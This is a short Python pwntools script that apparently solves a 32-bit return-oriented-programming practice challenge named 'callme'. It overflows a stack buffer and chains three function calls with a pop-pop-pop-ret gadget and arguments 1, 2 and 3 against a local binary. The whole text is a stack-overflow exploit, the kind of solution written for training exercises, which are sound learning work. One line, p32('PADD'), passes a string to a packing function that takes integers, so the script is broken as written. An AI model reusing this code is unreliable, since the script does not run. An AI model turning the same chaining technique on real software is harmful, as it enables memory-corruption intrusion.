from pwn import *

callmeone = p32(0x80485c0)
callmetwo = p32(0x8048620)
callmethree = p32(0x080485b0)
pop3ret = p32(0x080488a9)
offset = "A"*44

payload = offset + callmeone + pop3ret + p32(0x1) + p32(0x2) + p32(0x3) + callmetwo + pop3ret + p32(0x1) + p32(0x2) + p32(0x3) + callmethree + p32("PADD") + p32(0x1)  + p32(0x2) + p32(0x3)

p = process('./callme32')
p.recvline()
p.sendline(payload)
p.interactive()
